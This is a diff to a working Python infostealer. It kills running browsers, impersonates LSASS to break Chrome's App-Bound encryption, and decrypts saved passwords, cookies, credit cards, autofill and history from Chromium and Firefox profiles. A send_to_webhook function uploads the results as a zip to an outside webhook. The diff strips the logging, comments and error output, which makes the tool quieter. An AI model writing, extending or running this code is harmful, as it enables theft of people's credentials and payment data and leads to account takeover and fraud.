@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 import os
 import argparse
 import io
@@ -29,10 +30,6 @@ import base64
 
 multiprocessing.freeze_support()
 
-
-
-
-# Tüm desteklenen tarayıcılar
 BROWSERS = {
     'chrome': {
         'name': 'Google Chrome',
@@ -201,15 +198,11 @@ def is_admin():
         return False
 
 def kill_browser_processes():
-    """Tarayıcı process'lerini gizlice kapat"""
     import psutil
-    
     browsers_killed = []
-    
     for config in BROWSERS.values():
         process_name = config['process_name']
         try:
-            # psutil ile process'leri bul ve kapat
             for proc in psutil.process_iter(['pid', 'name']):
                 try:
                     if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
@@ -219,8 +212,6 @@ def kill_browser_processes():
                     pass
         except:
             pass
-    
-    # Tüm process'lerin kapatılmasını bekle
     if browsers_killed:
         time.sleep(2)
 
@@ -312,7 +303,6 @@ def derive_v20_master_key(parsed_data: dict, key_name) -> bytes:
         cipher = AES.new(xored, AES.MODE_GCM, nonce=parsed_data['iv'])
         return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
     else:
-        print(f"   [!] Unknown flag: {parsed_data.get('flag')}")
         return parsed_data.get('raw_data', b'')
 
 def decrypt_v20_value(encrypted_value: bytes, master_key: bytes) -> str:
@@ -328,7 +318,6 @@ def decrypt_v20_value(encrypted_value: bytes, master_key: bytes) -> str:
                 decrypted = cipher.decrypt_and_verify(payload, tag)
                 return decrypted[32:].decode('utf-8', errors='replace')
             except:
-                # Fallback to standard DPAPI if AES-GCM fails (common for v10)
                 if encrypted_value[:3] == b'v10':
                     return windows.crypto.dpapi.unprotect(encrypted_value[3:]).decode('utf-8', errors='replace')
         return "DECRYPT_FAILED"
@@ -348,7 +337,6 @@ def decrypt_v20_password(encrypted_value: bytes, master_key: bytes) -> str:
                 decrypted = cipher.decrypt_and_verify(payload, tag)
                 return decrypted.decode('utf-8', errors='replace')
             except:
-                # Fallback to standard DPAPI if AES-GCM fails (common for v10)
                 if encrypted_value[:3] == b'v10':
                     return windows.crypto.dpapi.unprotect(encrypted_value[3:]).decode('utf-8', errors='replace')
         return "NOT_V20_OR_V10"
@@ -393,7 +381,6 @@ def extract_history(profile_path):
         os.unlink(db_copy)
         history_items = []
         for url, title, visit_count, last_visit in rows:
-            # Simple conversion for chrome time
             try:
                 dt = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(last_visit/1000000 - 11644473600))
             except:
@@ -428,32 +415,23 @@ def get_master_key(config):
         if 'os_crypt' not in local_state:
             return None
         if 'app_bound_encrypted_key' in local_state['os_crypt']:
-            print(f"   [*] Detected v20 (App-Bound) encryption")
             enc_key = binascii.a2b_base64(local_state['os_crypt']['app_bound_encrypted_key'])[4:]
         elif 'encrypted_key' in local_state['os_crypt']:
-            print(f"   [*] Detected v10 (DPAPI) encryption")
             enc_key = binascii.a2b_base64(local_state['os_crypt']['encrypted_key'])[5:]
             return windows.crypto.dpapi.unprotect(enc_key)
         else:
-            print(f"   [!] No encrypted key found in Local State")
             return None
-
-        print(f"   [*] Attempting App-Bound decryption...")
         try:
             with impersonate_lsass():
-                print(f"   [*] Impersonated LSASS, unprotecting system DPAPI...")
                 system_dec = windows.crypto.dpapi.unprotect(enc_key)
-            print(f"   [*] Unprotecting user DPAPI...")
             user_dec = windows.crypto.dpapi.unprotect(system_dec)
             parsed = parse_key_blob(user_dec)
             if parsed['flag'] not in (1, 2, 3):
                 return user_dec[-32:]
             return derive_v20_master_key(parsed, config['key_name'])
         except Exception as inner_e:
-            print(f"   [!] App-Bound decryption failed: {inner_e}")
             return None
     except Exception as e:
-        print(f"   [!] Master key retrieval failed: {e}")
         return None
 
 def write_to_file(base_path: str, rel_path: str, content: str):
@@ -468,35 +446,23 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
     data_path = pathlib.Path(user_profile) / config['data_path']
     if not data_path.exists():
         return
-
-    # Profil tarama logicini iyileştir
     potential_profiles = [p for p in data_path.iterdir() if p.is_dir()]
     profiles = []
-    
-    # Gerçek profil klasörlerini tespit et (Login Data veya Cookies barındıranlar)
     valid_indicators = ["Login Data", "Web Data", "Cookies", "History", "Network"]
     for p in potential_profiles:
         if p.name == "Default" or p.name.startswith("Profile") or any((p / ind).exists() for ind in valid_indicators):
             profiles.append(p)
-    
-    # Fallback: Eğer hiç profil bulunamadıysa ama ana dizinde Login Data varsa
     if not profiles and (data_path / "Login Data").exists():
         profiles = [data_path]
-
     for profile_dir in profiles:
         profile_name = profile_dir.name
         prefix = f"{browser_name}/{profile_name}/"
-
-        # Bookmarks & History
         bookmarks = extract_bookmarks(profile_dir)
         if bookmarks:
             write_to_file(base_path, prefix + "bookmarks.txt", "# Name\tURL\n" + "\n".join(bookmarks))
-        
         history = extract_history(profile_dir)
         if history:
             write_to_file(base_path, prefix + "history.txt", "# URL\tTitle\tVisit Count\tLast Visit\n" + "\n".join(history))
-
-        # Passwords
         passwords_content = ""
         login_db = profile_dir / "Login Data"
         if login_db.exists():
@@ -512,7 +478,7 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
                                 dec = decrypt_v20_password(pw, master_key)
                                 if dec and dec not in ("DECRYPT_FAILED", "NOT_V20_OR_V10"):
                                     passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
-                            elif pw[:3] == b'v10' and not master_key: # Legacy DPAPI
+                            elif pw[:3] == b'v10' and not master_key:
                                 try:
                                     dec = windows.crypto.dpapi.unprotect(pw[3:]).decode('utf-8', errors='replace')
                                     passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {dec}\n\n"
@@ -522,14 +488,10 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
                         write_to_file(base_path, prefix + "passwords.txt", passwords_content)
                 except: pass
                 if tmp_db.exists(): os.unlink(tmp_db)
-
-        # Cookies
         cookies_content = ""
-        # Check both Network/Cookies and root Cookies
         cookies_db = profile_dir / "Network" / "Cookies"
         if not cookies_db.exists():
             cookies_db = profile_dir / "Cookies"
-            
         if cookies_db.exists():
             tmp_db = fetch_sqlite_copy(cookies_db)
             if tmp_db:
@@ -541,7 +503,6 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
                         if enc and enc[:3] in (b'v10', b'v11', b'v20'):
                             dec = decrypt_v20_value(enc, master_key)
                             if dec and dec != "DECRYPT_FAILED":
-                                # Netscape format
                                 flag = "TRUE" if (host and host.startswith('.')) else "FALSE"
                                 secure_str = "TRUE" if sec else "FALSE"
                                 try:
@@ -554,8 +515,6 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
                         write_to_file(base_path, prefix + "cookies.txt", "# Netscape HTTP Cookie File\n" + cookies_content)
                 except: pass
                 if tmp_db.exists(): os.unlink(tmp_db)
-        
-        # Credit Cards & Autofill
         autofill_content = ""
         credit_cards_content = ""
         webdata_db = profile_dir / "Web Data"
@@ -587,30 +546,21 @@ def process_chromium_browser(browser_name, config, master_key, base_path):
                     if credit_cards_content: write_to_file(base_path, prefix + "credit_cards.txt", credit_cards_content)
                 except: pass
                 if tmp_db.exists(): os.unlink(tmp_db)
-            pass
 
 def process_firefox_browser(browser_name, config, base_path):
     user_profile = os.environ['USERPROFILE']
     profiles_path = pathlib.Path(user_profile) / config['data_path']
     if not profiles_path.exists(): return
-
-    # NSS structures
     class SECItem(ctypes.Structure):
         _fields_ = [('type', ctypes.c_uint), ('data', ctypes.c_void_p), ('len', ctypes.c_uint)]
-
-    # Load NSS
     nss_dll = None
     for p in [r"C:\Program Files\Mozilla Firefox\nss3.dll", r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll"]:
         if os.path.exists(p):
             try: nss_dll = ctypes.CDLL(p); break
             except: pass
-
     profile_dirs = [p for p in profiles_path.iterdir() if p.is_dir() and ('default' in p.name.lower() or 'release' in p.name.lower() or 'beta' in p.name.lower())]
-
     for profile_dir in profile_dirs:
         prefix = f"{browser_name}/{profile_dir.name}/"
-        
-        # Cookies
         cookies_content = ""
         cookies_db = profile_dir / "cookies.sqlite"
         if cookies_db.exists():
@@ -623,12 +573,8 @@ def process_firefox_browser(browser_name, config, base_path):
                 con.close()
                 if cookies_content: write_to_file(base_path, prefix + "cookies.txt", cookies_content)
             except: pass
-
-        # Passwords (Decryption with NSS)
         passwords_content = ""
         logins_json = profile_dir / "logins.json"
-        
-        # Add Raw Files
         if logins_json.exists(): 
             try:
                 dest = os.path.join(base_path, prefix, "raw/logins.json")
@@ -641,19 +587,15 @@ def process_firefox_browser(browser_name, config, base_path):
                 os.makedirs(os.path.dirname(dest), exist_ok=True)
                 shutil.copy2(profile_dir / "key4.db", dest)
             except: pass
-
         if logins_json.exists() and nss_dll:
             try:
-                # NSS Init
                 if nss_dll.NSS_Init(str(profile_dir).encode('utf-8')) == 0:
                     with open(logins_json, "r", encoding="utf-8") as f:
                         data = json.load(f)
-                    
                     for entry in data.get("logins", []):
                         url = entry.get('hostname', '')
                         user = entry.get('username', '')
                         enc_pass = entry.get('encryptedPassword', entry.get('password', ''))
-                        
                         decrypted = "Failed to decrypt"
                         if enc_pass:
                             try:
@@ -663,13 +605,9 @@ def process_firefox_browser(browser_name, config, base_path):
                                 if nss_dll.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None) == 0:
                                     decrypted = ctypes.string_at(out.data, out.len).decode('utf-8')
                             except: pass
-                        
                         passwords_content += f"URL: {url}\nLogin: {user}\nPassword: {decrypted}\n\n"
-                    
                     nss_dll.NSS_Shutdown()
             except: pass
-        
-        # Fallback if NSS failed or not found
         if not passwords_content and logins_json.exists():
             try:
                 with open(logins_json, "r", encoding="utf-8") as f:
@@ -677,22 +615,16 @@ def process_firefox_browser(browser_name, config, base_path):
                 for entry in data.get("logins", []):
                     passwords_content += f"URL: {entry.get('hostname')}\nUser: {entry.get('username')}\nPass: {entry.get('encryptedPassword')} (Encrypted - NSS DLL missing)\n\n"
             except: pass
-            
         if passwords_content.strip():
-            print(f"   [+] {profile_dir.name}: Extracted {passwords_content.count('URL:')} passwords")
             write_to_file(base_path, prefix + "passwords.txt", passwords_content)
 
 def send_to_webhook(zip_path, webhook_url):
     if not os.path.exists(zip_path):
         return
-
     try:
         boundary = '----WebKitFormBoundary' + binascii.hexlify(os.urandom(16)).decode('ascii')
-        
         with open(zip_path, 'rb') as f:
             file_content = f.read()
-            
-        # Multipart/form-data body oluşturma
         body = []
         body.append(f'--{boundary}'.encode('utf-8'))
         body.append(f'Content-Disposition: form-data; name="file"; filename="browsers.zip"'.encode('utf-8'))
@@ -701,54 +633,36 @@ def send_to_webhook(zip_path, webhook_url):
         body.append(file_content)
         body.append(f'--{boundary}--'.encode('utf-8'))
         body.append(b'')
-        
         body_bytes = b'\r\n'.join(body)
-        
         req = urllib.request.Request(webhook_url, data=body_bytes)
         req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
         req.add_header('User-Agent', 'Mozilla/5.0')
-        
         with urllib.request.urlopen(req) as response:
             pass
-            
     except:
         pass
 
 def main():
-    print(f"� Cookie Engine Started")
-    print(f"�🔎 Scanning browsers...")
     parser = argparse.ArgumentParser()
     parser.add_argument('mode', nargs='?', default='all')
     parser.add_argument('--fingerprint', action='store_true')
     parser.add_argument('--output-path', required=False)
     args = parser.parse_args()
-
     try:
         kill_browser_processes()
         time.sleep(1)
-        
         out = args.output_path if args.output_path else "output"
         if not os.path.exists(out): os.makedirs(out, exist_ok=True)
-
         for n, c in BROWSERS.items():
             try:
-                print(f"Processing {c['name']}...")
                 if c['chromium_based']:
                     mk = get_master_key(c)
                     if mk: 
                         process_chromium_browser(n, c, mk, out)
-                    else:
-                        print(f"   [!] Failed to get master key for {c['name']}")
                 else:
                     process_firefox_browser(n, c, out)
-            except Exception as e: 
-                print(f"   [!] Error in browser {n}: {e}")
-
-        print(f"Successfully saved to folder: {out}")
-    except Exception as e:
-        print(f"CRITICAL ERROR in main loop: {e}")
-        import traceback
-        traceback.print_exc()
+            except: pass
+    except: pass
 
 if __name__ == "__main__":
     main()
